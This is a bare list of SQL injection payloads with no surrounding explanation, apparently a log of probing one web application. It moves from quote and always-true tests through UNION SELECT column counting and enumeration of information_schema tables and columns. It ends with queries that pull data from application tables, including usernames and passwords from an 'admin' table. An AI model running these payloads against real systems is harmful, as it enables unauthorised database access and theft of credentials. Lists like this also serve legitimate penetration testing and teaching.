1
'
1'
1' OR TRUE-- 
1' UNION SELECT NULL FROM information_schema.tables-- 
1' UNION SELECT NULL, NULL FROM information_schema.tables-- 
1' UNION SELECT NULL, NULL, NULL FROM information_schema.tables-- 
1' UNION SELECT NULL, NULL, NULL, NULL FROM information_schema.tables-- 
1' UNION SELECT TABLE_NAME, NULL, NULL, NULL FROM information_schema.tables-- 
1' UNION SELECT NULL, TABLE_NAME, NULL, NULL FROM information_schema.tables-- 
1' UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM information_schema.columns-- 
1' UNION SELECT NULL, username, password, NULL FROM admin-- 
1' UNION SELECT NULL, images, NULL, NULL FROM image-- 
1' UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM information_schema.columns WHERE TABLE_NAME='commentsnew'-- 
1' UNION SELECT NULL, name, comment, NULL FROM commentsnew-- 
1' UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM information_schema.columns WHERE TABLE_NAME='types'-- 
1' UNION SELECT NULL, name, description, NULL FROM types-- 
1' UNION SELECT NULL, NULL, NULL, NULL FROM types-- 
1' UNION SELECT name, NULL, NULL, NULL FROM types-- 
1' UNION SELECT name, name, NULL, NULL FROM types-- 
